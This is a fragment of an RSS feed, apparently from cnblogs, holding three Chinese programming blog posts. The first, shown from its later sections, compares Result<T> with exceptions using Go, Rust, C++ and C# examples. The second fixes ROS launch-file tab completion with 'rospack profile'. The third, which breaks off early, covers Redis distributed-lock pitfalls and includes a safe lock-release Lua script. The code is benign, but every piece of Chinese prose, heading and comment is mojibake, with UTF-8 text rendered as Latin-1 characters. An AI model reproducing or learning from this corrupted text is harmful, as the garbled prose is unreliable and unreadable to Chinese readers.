<li><strong>æ²¡æå¼å¸¸æºå¶</strong>ï¼åªæéè¯¯è¿åå¼</li>
<li><strong>éè¯¯æ¯å¼ï¼errors are valuesï¼</strong>ï¼å¯ä»¥åæ®éå¼ä¸æ ·ä¼ é</li>
<li><strong>å¼ºå¶æ¾å¼å¤ç</strong>ï¼æ æ³å¿½ç¥éè¯¯ï¼é¤éä½¿ç¨_ï¼</li>
<li><strong>é¶ææ¬æ½è±¡</strong>ï¼éè¯¯å¤çå ä¹æ²¡æè¿è¡æ¶å¼é</li>
</ul>
<p>Goçéè¯¯æ§è½ä¼å¿:</p>
<pre><code class="language-go">// Goçerrors.Newå®éä¸å¾ç®å
func New(text string) error {
    return &amp;errorString{text}
}

type errorString struct {
    s string
}

func (e *errorString) Error() string {
    return e.s
}

// æ²¡æå æ è·è¸ªï¼æ²¡æå¤ææé 
// åªæ¯ä¸ä¸ªåå«å­ç¬¦ä¸²çç»æä½
</code></pre>
<h3 id="443-rustçresultç±»å">4.4.3 RustçResultç±»å</h3>
<pre><code class="language-rust">// Rustçéè¯¯å¤çï¼åºäºæä¸¾çResult
fn login(username: &amp;str, password: &amp;str) -&gt; Result&lt;User, LoginError&gt; {
    let user = find_user(username)?;  // ?æä½ç¬¦èªå¨ä¼ æ­éè¯¯
    
    if !verify_password(&amp;user, password) {
        return Err(LoginError::InvalidPassword);
    }
    
    Ok(user)
}

// éè¯¯ç±»åå®ä¹
#[derive(Debug)]
enum LoginError {
    UserNotFound,
    InvalidPassword,
    DatabaseError(DbError),
}

// ä½¿ç¨matchå¤ç
match login("test", "123") {
    Ok(user) =&gt; println!("æ¬¢è¿ {}", user.name),
    Err(LoginError::UserNotFound) =&gt; println!("ç¨æ·ä¸å­å¨"),
    Err(LoginError::InvalidPassword) =&gt; println!("å¯ç éè¯¯"),
    Err(e) =&gt; println!("å¶ä»éè¯¯: {:?}", e),
}
</code></pre>
<p>Rustçè®¾è®¡ç¹ç¹:</p>
<ul>
<li>é¶ææ¬æ½è±¡ï¼Resultå¨è¿è¡æ¶éå¸¸æ¯æ®éæä¸¾</li>
<li>æ¨¡å¼å¹éï¼ç¼è¯å¨ç¡®ä¿æææåµé½è¢«å¤ç</li>
<li>éè¯¯ä¼ æ­è¿ç®ç¬¦ï¼?ï¼ï¼ç®åéè¯¯ä¼ æ­</li>
<li>ä¸°å¯çéè¯¯åºï¼anyhowãthiserrorç­</li>
</ul>
<p>Rustçæ§è½ä¼å¿ï¼</p>
<pre><code>ç¼è¯åçResultéå¸¸ä¼åä¸ºï¼
1.æåï¼å­å¨User
2.å¤±è´¥ï¼å­å¨éè¯¯ç ï¼éå¸¸æ¯æ´æ°ï¼
3.æ²¡æå åéï¼æ²¡æèå½æ°è°ç¨
</code></pre>
<h3 id="444-cçéè¯¯å¤ç">4.4.4 C++çéè¯¯å¤ç</h3>
<pre><code class="language-cpp">// C++çå¤ç§éè¯¯å¤çæ¹å¼

// 1. å¼å¸¸ï¼ç±»ä¼¼C#/Javaï¼
User login(const std::string&amp; username, const std::string&amp; password) {
    auto user = find_user(username);
    if (!user) {
        throw UserNotFoundException("ç¨æ·ä¸å­å¨");
    }
    if (!verify_password(*user, password)) {
        throw InvalidPasswordException("å¯ç éè¯¯");
    }
    return *user;
}

// 2. éè¯¯ç ï¼ä¼ ç»æ¹å¼ï¼
int login(const std::string&amp; username, 
          const std::string&amp; password,
          User&amp; out_user) {
    User user;
    int err = find_user(username, user);
    if (err != 0) return err;
    
    if (!verify_password(user, password)) {
        return ERROR_INVALID_PASSWORD;
    }
    
    out_user = user;
    return 0;  // æå
}

// 3. std::expectedï¼C++23ï¼
std::expected&lt;User, Error&gt; login(const std::string&amp; username,
                                 const std::string&amp; password) {
    auto user = find_user(username);
    if (!user) {
        return std::unexpected(Error::UserNotFound);
    }
    if (!verify_password(*user, password)) {
        return std::unexpected(Error::InvalidPassword);
    }
    return *user;
}
</code></pre>
<p>C++çéæ©ï¼</p>
<ul>
<li>æ¸¸æååµå¥å¼ï¼éå¸¸ç¦ç¨å¼å¸¸ï¼ä½¿ç¨éè¯¯ç </li>
<li>æ§è½ææåºç¨ï¼é¿åå¼å¸¸ï¼å ä¸ºé¶å¼éåå</li>
<li>ç°ä»£C++ï¼å¾åäºstd::expectedç­ç±»åå®å¨æ¹æ¡</li>
</ul>
<h2 id="45-net-coreçæ¹è¿åå±é">4.5 .NET Coreçæ¹è¿åå±é</h2>
<p>.Net 8.0çæ¬ï¼å®æ¹å¢ééå¯¹å¼å¸¸å¤çè¿åè¿è¡äºå¤§å¹çä¼åï¼åæ¬é¢åéå¼å¸¸å¯¹è±¡ï¼PREallocated Exceptionï¼ãå»¶è¿å æ è·è¸ªçæï¼Lazy Stack Traceï¼ãå æ è·è¸ªç¼å­åå¤ç¨ãæ°çå æ è·è¸ªç®æ³ç­å¤ç§ææ®µï¼åæ¶ä¹å¯¹JITåRunTimeè¿è¡äºéå¯¹æ§ä¼åãä½æ¯ç®åæ¥çï¼ä¾æ§è¿æå¾å¤§çæåç©ºé´ã<br>
è¯¦æè¯·è§å®æ¹å¢éçåå®¢ï¼<a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/#exception-handling" target="_blank" rel="noopener nofollow">https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-8/#exception-handling</a></p>
<pre><code class="language-csharp">// .NET 8.0 å¯¹åæ°å¼å¸¸çç¹æ®ä¼å
public void ValidateUser(string username, int age)
{
    // è¿äºè°ç¨å¨ .NET 8.0 ä¸­éå¸¸é«æ
    ArgumentNullException.ThrowIfNull(username);
    ArgumentOutOfRangeException.ThrowIfNegative(age);
    ArgumentException.ThrowIfNullOrEmpty(username);
    
    // ä½æ³¨æï¼ä¸å¡å¼å¸¸ä¸å¨æ­¤ä¼åèå´åï¼
    if (!IsValidUsername(username))
        throw new BusinessException("æ æç¨æ·å"); // ä»£ä»·ä»ç¶æè´µ
}
</code></pre>
<h1 id="äºresultçè¿é¶ä¼å¿">äºãResult<t>çè¿é¶ä¼å¿</t></h1>
<h2 id="51-ä¸°å¯çéè¯¯ä¿¡æ¯">5.1 ä¸°å¯çéè¯¯ä¿¡æ¯</h2>
<pre><code class="language-csharp">public class Result&lt;T&gt;
{
    public bool Success { get; }
    public T? Value { get; }
    public string ErrorCode { get; }    // éè¯¯ä»£ç 
    public string ErrorMessage { get; } // éè¯¯æ¶æ¯
    public Dictionary&lt;string, object&gt; Metadata { get; } // éå ä¿¡æ¯
}

// ä½¿ç¨ï¼
var result = Login("test", "wrong");
if (!result.Success)
{
    switch (result.ErrorCode)
    {
        case "USER_NOT_FOUND":
            // ç¨æ·ä¸å­å¨ï¼è·³è½¬æ³¨åé¡µé¢
            break;
        case "INVALID_PASSWORD":
            // å¯ç éè¯¯ï¼æ¾ç¤ºæç¤º
            break;
        case "ACCOUNT_LOCKED":
            // è´¦æ·éå®ï¼æ¾ç¤ºéå®æ¶é´
            var lockTime = result.Metadata["LockUntil"];
            break;
    }
}
</code></pre>
<h2 id="52-å½æ°å¼ç¼ç¨æ¯æ">5.2 å½æ°å¼ç¼ç¨æ¯æ</h2>
<pre><code class="language-csharp">// Map - è½¬æ¢æåçå¼
var userResult = GetUser(123);
var userName = userResult.Map(user =&gt; user.Name.ToUpper());

// Bind - é¾å¼æä½
var orderResult = GetUser(123)
    .Bind(user =&gt; GetOrder(user.CurrentOrderId))
    .Bind(order =&gt; ValidateOrder(order));

// Match - æ¨¡å¼å¹é
var message = loginResult.Match(
    success: user =&gt; $"æ¬¢è¿åæ¥ï¼{user.Name}!",
    failure: error =&gt; $"ç»å½å¤±è´¥: {error.Message}"
);
</code></pre>
<h2 id="53-æ´å¥½çapiè®¾è®¡">5.3 æ´å¥½çAPIè®¾è®¡</h2>
<pre><code class="language-csharp">// Web APIä¸­çä½¿ç¨
[HttpPost("login")]
public IActionResult Login([FromBody] LoginRequest request)
{
    var result = _authService.Login(request);
    
    return result.Match&lt;IActionResult&gt;(
        success: user =&gt; Ok(new { success = true, user }),
        failure: error =&gt; BadRequest(new { 
            success = false, 
            errorCode = error.Code,
            message = error.Message 
        })
    );
}

// å®¢æ·ç«¯è·å¾æ¸æ°çååºï¼
// æå: { success: true, user: { ... } }
// å¤±è´¥: { success: false, errorCode: "INVALID_PASSWORD", message: "å¯ç éè¯¯" }
</code></pre>
<h1 id="å­-resultæ¨¡å¼çä¸äºå¼ç«¯">å­ã Result<t>æ¨¡å¼çä¸äºå¼ç«¯</t></h1>
<h2 id="61-ifå°ç±é®é¢æ¡ä»¶å¤æ­æ³æ»¥">6.1 "ifå°ç±"é®é¢ï¼æ¡ä»¶å¤æ­æ³æ»¥ï¼</h2>
<p>æå¸¸è¢«è¯ççé®é¢ï¼å°±æ¯ä»£ç ä¸­åæ¥å¤§éç if (!result.Success) æ£æ¥ã</p>
<pre><code class="language-csharp">// "ifå°ç±"çå¸åä¾å­
public Result&lt;Order&gt; ProcessOrder(int userId, OrderRequest request)
{
    var userResult = GetUser(userId);
    if (!userResult.Success)
        return Result&lt;Order&gt;.Fail(userResult.Error);
    
    var validationResult = ValidateOrder(request);
    if (!validationResult.Success)
        return Result&lt;Order&gt;.Fail(validationResult.Error);
    
    var inventoryResult = CheckInventory(request.Items);
    if (!inventoryResult.Success)  
        return Result&lt;Order&gt;.Fail(inventoryResult.Error);
    
    var paymentResult = ProcessPayment(userResult.Value, request);
    if (!paymentResult.Success)
        return Result&lt;Order&gt;.Fail(paymentResult.Error);
    
    // ... æ´å¤æ£æ¥
}
</code></pre>
<p>è¿ä¸ªé®é¢ï¼ä½¿ç¨å½æ°å¼ç¼ç¨ææ³å¯ä»¥å·§å¦è§£å³ï¼è¿ä¸åJAVAåççå¿æºä¸éçã</p>
<pre><code class="language-csharp">// ä½¿ç¨ Railway-Oriented Programming
public Result&lt;Order&gt; ProcessOrder(int userId, OrderRequest request)
{
    return GetUser(userId)
        .Bind(user =&gt; ValidateOrder(request)
            .Bind(validated =&gt; CheckInventory(request.Items)
                .Bind(inventory =&gt; ProcessPayment(user, request)
                    .Map(payment =&gt; CreateOrder(user, validated, payment)))));
}

// æèä½¿ç¨æ©å±æ¹æ³
public Result&lt;Order&gt; ProcessOrder(int userId, OrderRequest request)
{
    return GetUser(userId)
        .Then(user =&gt; ValidateOrder(request))
        .Then(validated =&gt; CheckInventory(request.Items))
        .Then(inventory =&gt; ProcessPayment(user, request))
        .Map(payment =&gt; CreateOrder(user, validated, payment));
}
</code></pre>
<h2 id="62-å¼ç±»åstructvs-å¼ç¨ç±»åclassçä¸¤é¾éæ©">6.2 å¼ç±»åï¼structï¼vs å¼ç¨ç±»åï¼classï¼çä¸¤é¾éæ©</h2>
<pre><code class="language-csharp">public readonly struct Result&lt;T&gt;  // å¼ç±»å
{
    private readonly T? _value;
    private readonly string? _error;
    
    // é®é¢1ï¼Tæ¯å¼ç¨ç±»åæ¶ï¼structå­å¨çæ¯å¼ç¨
    // é®é¢2ï¼structå¤å¶å¼éï¼å¦æTæ¯å¤§å¯¹è±¡ï¼
    // é®é¢3ï¼è£ç®±/æç®±å¼é
    // é®é¢4ï¼ä¸è½ä¸ºnullï¼éè¦é¢å¤ç¶ææ è®°
}

public class Result&lt;T&gt;  // å¼ç¨ç±»å
{
    // é®é¢ï¼æ¯ä¸ªResulté½æ¯å åéï¼å¢å GCåå
    // å³ä½¿æåæåµä¹è¦åéå¯¹è±¡
}

</code></pre>
<p>æä¸­æ¹æ¡ï¼éå¯¹å¼ç±»ååå¼ç¨ç±»ååå«ä¼åï¼éå¯¹éç¨çResultå¯¹è±¡è¿è¡ç¼å­åå¤ç¨ã</p>
<pre><code class="language-csharp">/// &lt;summary&gt;
/// ç»æåºç±»
/// &lt;/summary&gt;
/// &lt;typeparam name="T"&gt;&lt;/typeparam&gt;
public abstract class Result&lt;T&gt;
{
    /// &lt;summary&gt;
    /// æ¯å¦æå
    /// &lt;/summary&gt;
    public abstract bool IsSuccess { get; }
    /// &lt;summary&gt;
    /// å·ä½è¿åå¼ï¼æåæ¶ææï¼
    /// &lt;/summary&gt;
    public abstract T? Value { get; }
    /// &lt;summary&gt;
    /// éè¯¯ç 
    /// &lt;/summary&gt;
    public abstract string? ErrorCode { get; }
    /// &lt;summary&gt;
    /// éè¯¯ä¿¡æ¯
    /// &lt;/summary&gt;
    public abstract string? ErrorMessage { get; }
  
    // ç¼å­åä¾æåï¼ä»éå¯¹ default(T)ï¼
    private static readonly ConcurrentDictionary&lt;Type, Result&lt;T&gt;&gt; _successCache = new();
    //åªæ errorCode ç¼å­ï¼é¿åæ message æ éå¢é¿ï¼
    private static readonly ConcurrentDictionary&lt;string, Result&lt;T&gt;&gt; _errorCache = new();  
} 

/// &lt;summary&gt;
/// ä»ç¨äºæ§è½å³é®è·¯å¾ï¼ä¸å­å¨å¤§å¯¹è±¡
/// &lt;/summary&gt;
/// &lt;typeparam name="T"&gt;&lt;/typeparam&gt;
public readonly ref struct ValueResult&lt;T&gt; where T : struct
{
  //çç¥
}

 /// &lt;summary&gt;
 /// å¼ç¨ç±»åç»æï¼ä»ç¨äºæ§è½å³é®è·¯å¾
 /// &lt;/summary&gt;
 /// &lt;typeparam name="T"&gt;&lt;/typeparam&gt;
 public readonly ref struct RefResult&lt;T&gt; where T : class
{
 //çç¥
}
</code></pre>
<h2 id="63-å¼æ­¥ç¼ç¨çå¤ææ§">6.3 å¼æ­¥ç¼ç¨çå¤ææ§</h2>
<p>å¨å¼æ­¥ç¼ç¨ä¸­ï¼å¯è½æ¯ä¸ªå¼æ­¥æä½é½éè¦å¤çResultï¼è¿ä¹å¤§å¤§å¢å äºä»£ç å¤æåº¦ï¼å¶å®ä¹å±äºä¸é¢è¯´çâif å°ç±âèç´ã</p>
<pre><code class="language-csharp">public async Task&lt;Result&lt;User&gt;&gt; LoginAsync(string username, string password)
{
    // æ¯ä¸ªå¼æ­¥æä½é½éè¦å¤çResult
    var userResult = await FindUserAsync(username);
    if (!userResult.Success)
        return Result&lt;User&gt;.Fail(userResult.Error);
    
    var validationResult = await ValidatePasswordAsync(userResult.Value, password);
    if (!validationResult.Success)
        return Result&lt;User&gt;.Fail(validationResult.Error);
    
    return Result&lt;User&gt;.Ok(userResult.Value);
}

// å¯¹æ¯å¼å¸¸çæ¬ï¼
public async Task&lt;User&gt; LoginAsync(string username, string password)
{
    var user = await FindUserAsync(username);  // æå¼å¸¸åç´æ¥ä¸­æ­åç»­é»è¾
    await ValidatePasswordAsync(user, password); // æå¼å¸¸åç´æ¥ä¸­æ­åç»­é»è¾
    return user;
}
</code></pre>
<h2 id="64-ç±»åç³»ç»åé¿">6.4 ç±»åç³»ç»åé¿</h2>
<p>æ¯ä¸ä¸ªæ¥å£æ¹æ³é½è¦åè£¹Result,åå ä¸å¼æ­¥çTask,åé¡µè¯·æ±ç»ææ¨¡åPagedResultï¼åå ä¸ç¹å¶ä»ä¸è¥¿ï¼å°±ä¼åºç°ä»¤äººå¤´ç®åéº»çæ³ååæ°çç¸&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;ã<br>
ä¸é¢çä»£ç ï¼æ¯é¡¹ç®éé¢ççå®ä»£ç </p>
<pre><code class="language-csharp">     /// &lt;summary&gt;
    /// åå·¥ä¸å¡æå¡æ¥å£
    /// &lt;/summary&gt;
    public interface IEmployeeService
    {
        Task&lt;Result&lt;long&gt;&gt; CreateAsync(CreateEmployeeDto dto);
        Task&lt;Result&lt;EmployeeDto&gt;&gt; GetByIdAsync(long id);
        Task&lt;Result&gt; UpdateAsync(UpdateEmployeeDto dto);
        Task&lt;Result&gt; DeleteAsync(long id);
        Task&lt;Result&lt;PagedResult&lt;EmployeeDto&gt;&gt;&gt; GetPageListAsync(EmployeePageListDto dto);
        Task&lt;Result&lt;List&lt;EmployeeDto&gt;&gt;&gt; GetListAsync(string? keyword = null);
        Task&lt;Result&lt;Dictionary&lt;string,long&gt;&gt;&gt; GetEmployeeAliases(List&lt;long&gt;? employeeIds = null, bool includeShowName = true);
    }
</code></pre>
<h2 id="65-å¶ä»é®é¢">6.5 å¶ä»é®é¢</h2>
<p>å½ç¶ï¼è¿ç§æ¨¡å¼è¿æä¸äºå¶ä»çé®é¢ï¼æ¯å¦å¢éæåçæ¥ååº¦ï¼å¢éå­¦ä¹ ææ¬ï¼ä¸ç°æä»£ç /çæçå¼å®¹æ§ï¼ä¸ç¬¬ä¸æ¹åçå¼å®¹æ§ç­ï¼è¿éå°±ä¸ä¸ä¸è¯´æäºã</p>
<h1 id="ä¸å¸¸è§é®é¢ä¸ç­ç">ä¸ãå¸¸è§é®é¢ä¸ç­ç</h1>
<p><strong>Qï¼å¼å¸¸ä¸æ¯æ´æ¹ä¾¿åï¼ä¸è¡ä»£ç å°±è½ä¸­æ­æµç¨</strong><br>
Aï¼æ¹ä¾¿ä¸ç­äºæ­£ç¡®ãgotoè¯­å¥ä¹å¾"æ¹ä¾¿"ï¼ä½ç°ä»£ç¼ç¨ä¸­æä»¬é¿åä½¿ç¨å®ãå¼å¸¸å¨ä¸å¡é»è¾ä¸­å°±æ¯"è¿ç¨goto"ï¼ç ´åäºä»£ç çå¯è¯»æ§åå¯ç»´æ¤æ§ã</p>
<p><strong>Qï¼Result<t>éè¦æ´å¤çifå¤æ­ï¼ä»£ç æ´åé¿</t></strong></p>
<pre><code class="language-csharp">// ç®æ´çå¤çæ¹å¼
var result = Login("test", "123");
if (!result.Success) return result;

// æèä½¿ç¨æ¨¡å¼å¹é
var message = result switch
{
    { Success: true, Value: var user } =&gt; $"æ¬¢è¿ {user.Name}",
    { Error: var error } =&gt; $"éè¯¯: {error}",
    _ =&gt; "æªç¥ç¶æ"
};
</code></pre>
<p><strong>Qï¼æä»¬çé¡¹ç®å¾å°ï¼æ§è½å½±åä¸å¤§</strong><br>
A:å³ä½¿ä¸èèæ§è½ï¼ä»ä»£ç è´¨éåç»´æ¤æ§è§åº¦ï¼Result<t>ä¹æ¯æ´å¥½çéæ©ãå¥½çä¹ æ¯åºè¯¥ä»é¡¹ç®åæå°±å¼å§å¹å»ã</t></p>
<h1 id="å«æ»ç»">å«ãæ»ç»</h1>
<p>Result<t> ä¸æ¯é¶å¼¹ï¼å®æå®éç¨çåºæ¯ï¼ä¹æç¸åºçä¸äºå¼ç«¯ãéæ©çå³é®ä¸å¨äºåªä¸ª"æ´å¥½"ï¼èå¨äºåªä¸ª"æ´éå"å½åçåºæ¯åçº¦æãææºçå·¥ç¨å¸ä¼æ ¹æ®å·ä½æåµååºå¹³è¡¡çéæ©ã<br>
éåä½¿ç¨ Result<t> çåºæ¯ï¼</t></t></p>
<ul>
<li>é«é¢å¤±è´¥çæ ¡éªé»è¾ï¼è¡¨åéªè¯ãä¸å¡è§åæ£æ¥ï¼</li>
<li>éè¦æç¡®éè¯¯åç±»çä¸å¡æµç¨</li>
<li>APIè¾¹çï¼éè¦ç»æåéè¯¯ååºï¼</li>
<li>ä¸å¤é¨ç³»ç»äº¤äºï¼éè¦å¤çåç§å¤±è´¥æ¨¡å¼ï¼</li>
<li>éè¦ç»åçå¤æä¸å¡é»è¾</li>
</ul>
<p>ä»ç¶éåä½¿ç¨å¼å¸¸çåºæ¯ï¼</p>
<ul>
<li>çæ­£çç³»ç»æéï¼åå­ä¸è¶³ãæ°æ®åºå´©æºï¼</li>
<li>ç¨åºç¶æå¼å¸¸ï¼ç©ºå¼ç¨ãç´¢å¼è¶çï¼</li>
<li>ä¸æ»¡è¶³åç½®æ¡ä»¶ï¼æ æåæ°ï¼</li>
<li>å¼åé¶æ®µçæ­è¨æ£æ¥</li>
<li>æä½å¤±è´¥ççæä½</li>
</ul>
<p>å³é®å»ºè®®ï¼</p>
<ul>
<li>ä¸è¦å¨çæ¿æ¢ï¼Resultåå¼å¸¸åæéç¨åºæ¯</li>
<li>åå±è®¾è®¡ï¼ä¸åæ¶æå±ä½¿ç¨ä¸åç­ç¥</li>
<li>å¢éå±è¯ï¼å»ºç«æç¡®çè§èåè¾¹ç</li>
<li>æ¸è¿éç¨ï¼ä»æ ¸å¿ä¸å¡å¼å§ï¼éæ­¥æ©å±</li>
<li>çæ§åé¦ï¼éè¿æ¥å¿åçæ§éªè¯éæ©</li>
</ul>
<p>æç»ååï¼</p>
<ul>
<li>å¼å¸¸ï¼ç¨äº"ä¸åºè¯¥åç"çäºæ</li>
<li>Resultï¼ç¨äº"å¯è½åçä½éè¦å¤ç"çäºæ</li>
</ul>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.002777777777777778" data-date-updated="2026-01-20 19:44">2026-01-20 19:40</span>&nbsp;
<a href="https://www.cnblogs.com/diamondhusky">åèåå£«å¥</a>&nbsp;
éè¯»(<span id="post_view_count">40</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19508626);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19508626', targetLink: 'https://www.cnblogs.com/diamondhusky/p/19508626', title: 'åå« throw exceptionï¼ä¸ºä»ä¹ Result&amp;lt;T&amp;gt; ææ¯ä¸å¡é»è¾çæ­£ç¡®éæ©' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æ°åçlaunchæä»¶ä¸è½ç¨tabè¡¥å¨ ]]></title>
    <link>https://www.cnblogs.com/zylyehuo/p/19508618</link>
    <guid>f3cb5a70ae03ba8fa6c0dc6290b9ec5d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zylyehuo/p/19508618" title="åå¸äº 2026-01-20 19:38">
    <span role="heading" aria-level="2">æ°åçlaunchæä»¶ä¸è½ç¨tabè¡¥å¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>åå®¢å°åï¼<a href="https://www.cnblogs.com/zylyehuo/" target="_blank">https://www.cnblogs.com/zylyehuo/</a></p>
</blockquote>
<blockquote>
<p>ç³»ç»ç¯å¢ï¼ros1 noetc</p>
</blockquote>
<h1 id="é®é¢æè¿°">é®é¢æè¿°</h1>
<pre><code>launchæä»¶ä¸è½ç¨tabè¡¥å¨

å¨é¨ææ²æ¯è½è¿è¡ç(æ§è¡å® source ./devel/setup.bash)
</code></pre>
<h1 id="è§£å³æ¹æ³">è§£å³æ¹æ³</h1>
<blockquote>
<p>Tab è¡¥å¨å¤±è´¥çåå éå¸¸æ¯ ROS çåç´¢å¼ç¼å­ï¼rospack cacheï¼æ²¡ææ´æ°ã</p>
</blockquote>
<blockquote>
<p>å¨ç»ç«¯æ§è¡ä»¥ä¸å½ä»¤ï¼å¼ºå¶å·æ° ROS çåç´¢å¼</p>
</blockquote>
<pre><code>rospack profile
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260120193341341-871078635.png" alt="image" loading="lazy"></p>
<h1 id="åå åæ">åå åæ</h1>
<ul>
<li>
<p>Tab è¡¥å¨çæºå¶ï¼ ROS ç Tab è¡¥å¨ï¼bash completionï¼å¹¶ä¸å roslaunch è¿è¡å½ä»¤é£æ ·ç´æ¥å®æ¶å»æ«ææææä»¶å¤¹ãä¸ºäºéåº¦ï¼å®ä¾èµä¸ä¸ªç¼å­åè¡¨ã</p>
</li>
<li>
<p>ç¼å­æ»åï¼ å½ä½ åå»ºä¸ä¸ªæ°çåè½åï¼packageï¼æèå¨ä¸ä¸ªåéæ°å äºæä»¶æ¶ï¼è¿ä¸ªç¼å­åè¡¨å¹¶ä¸æ»æ¯ç«å»èªå¨æ´æ°ãè½ç¶ source ./devel/setup.bash åè¯äºç³»ç»âæçæ°åå¨åªéâï¼ä½ Tab è¡¥å¨å·¥å·æ¥çè¿æ¯æ§çâæ·å£æ¬âã</p>
</li>
<li>
<p>rospack profile çä½ç¨ï¼ è¿ä¸ªå½ä»¤ç¸å½äºè®© ROS éæ°æ«æä¸é ROS_PACKAGE_PATH ä¸çææç®å½ï¼å¹¶ä¿®å¤ç¼å­ãéå¸¸æ°å»ºäºåä¹åï¼æå¥½é½æå¨æ²ä¸ä¸è¿ä¸ªå½ä»¤ã</p>
</li>
</ul>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.0020833333333333333" data-date-updated="2026-01-20 19:41">2026-01-20 19:38</span>&nbsp;
<a href="https://www.cnblogs.com/zylyehuo">zylyehuo</a>&nbsp;
éè¯»(<span id="post_view_count">2</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19508618);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19508618', targetLink: 'https://www.cnblogs.com/zylyehuo/p/19508618', title: 'æ°åçlaunchæä»¶ä¸è½ç¨tabè¡¥å¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ å¹²è´§æ»¡æ»¡ï¼Redis åå¸å¼éå¿é¿ç 8 å¤§é®é¢åè§£å³æ¹æ¡ ]]></title>
    <link>https://www.cnblogs.com/sun-10387834/p/19493006</link>
    <guid>436793609d4e4f231f04487dd8708f85</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sun-10387834/p/19493006" title="åå¸äº 2026-01-20 19:23">
    <span role="heading" aria-level="2">å¹²è´§æ»¡æ»¡ï¼Redis åå¸å¼éå¿é¿ç 8 å¤§é®é¢åè§£å³æ¹æ¡</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>å¨åå¸å¼ç³»ç»ä¸­ï¼Redis åå¸å¼éè½è½é«æè§£å³è·¨æå¡å¹¶åå²çªï¼ä½å®éè½å°æ¶ç¨ä¸æ³¨æå°±ä¼è¸©åââå°å°æ°æ®ä¸ä¸è´ï¼å¤§å°æå¡éªå´©ï¼è¿äºé®é¢å¤æºäºå¯¹ Redis ç¹æ§ãåå¸å¼åºæ¯å¤ææ§çèèä¸å¨ãä¹åå¼åçµååºå­åè®¢åç³»ç»æ¶ï¼å°±å å¿½è§äºéè¿æãèè£ç­é®é¢ï¼åååºç°è¿è¶åãéå¤±æç­æéãä»å¤©ç»åçäº§å®æç»éªï¼æ¢³ç Redis å®ç°åå¸å¼éæ¶ææéå°ç 8 å¤§é®é¢ï¼éä¸æè§£æå ãè¡¨ç°åæ ¹æ²»æ¹æ¡ï¼å¸®å¤§å®¶é¿å¼è¿äºâéå½¢ç¸å¼¹âã</p>
<p>åæç¡®åæï¼åå¸å¼éçæ ¸å¿æ¯âäºæ¥æ§âï¼ä½å¨åå¸å¼ç¯å¢ä¸ï¼ç½ç»å»¶è¿ãæå¡å®æºãRedis éç¾¤åæ­¥å»¶è¿ç­å ç´ ï¼é½ä¼ç ´åéçç¨³å®æ§ãææé®é¢çæ¬è´¨ï¼è¦ä¹æ¯âåå­æ§ç¼ºå¤±âï¼è¦ä¹æ¯âé«å¯ç¨èèä¸è¶³âï¼è¦ä¹æ¯âä¸å¡ä¸éæºå¶ä¸å¹éâã</p>
<h2 id="ä¸æ ¸å¿é®é¢åè§£å³æ¹æ¡æè¸©åé¢çæåº">ä¸ãæ ¸å¿é®é¢åè§£å³æ¹æ¡ï¼æè¸©åé¢çæåºï¼</h2>
<h3 id="é®é¢-1è¯¯å ä»äººææéæåºç¡ä¹ææç¯çæ¼æ´">é®é¢ 1ï¼è¯¯å ä»äººææéââæåºç¡ä¹ææç¯çæ¼æ´</h3>
<p><strong>æå </strong>ï¼éæ¾éæ¶æªåèº«ä»½æ ¡éªï¼ç´æ¥æ§è¡ DEL å½ä»¤å é¤é®ãå¸ååºæ¯ï¼æå¡ A ææéåï¼ä¸å¡é»è¾èæ¶è¶è¿éè¿ææ¶é´ï¼éè¢«èªå¨éæ¾ï¼æå¡ B è¶æºå éæåï¼æ­¤æ¶æå¡ A æ§è¡å®ä¸å¡ï¼ç´æ¥ DEL éå°±ä¼è¯¯å æå¡ B ææçéï¼å¯¼è´äºæ¥æ§å¤±æã</p>
<p><strong>è¡¨ç°</strong>ï¼å¤ä¸ªæå¡å®ä¾åæ¶ææåä¸æéï¼æä½åä¸èµæºï¼åºç°æ°æ®ä¸ä¸è´ï¼å¦è¶åãéå¤è®¢åï¼ã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼å éæ¶å­å¥å¨å±å¯ä¸çéæºå¼ï¼å¦ UUID+çº¿ç¨ IDï¼ä½ä¸º valueï¼éæ¾éååéªè¯ value æ¯å¦ä¸èªèº«ææä¸è´ï¼ä¸è´æéæ¾ãå³é®æ¯ç¨ Lua èæ¬ä¿è¯âéªè¯+å é¤âçåå­æ§ï¼é¿åéªè¯åéè¿æè¢«ä»äººææã</p>
<pre><code class="language-lua">-- å®å¨éæ¾éç Lua èæ¬
if redis.call('get', KEYS[1]) == ARGV[1] then
    return redis.call('del', KEYS[1])
else
    return 0
end
</code></pre>
<p>æ³¨æï¼ä¸¥ç¦æåâéªè¯âåâå é¤âä¸ºä¸¤æ­¥æä½ï¼å¦åä»å­å¨å¹¶åæ¼æ´ã</p>
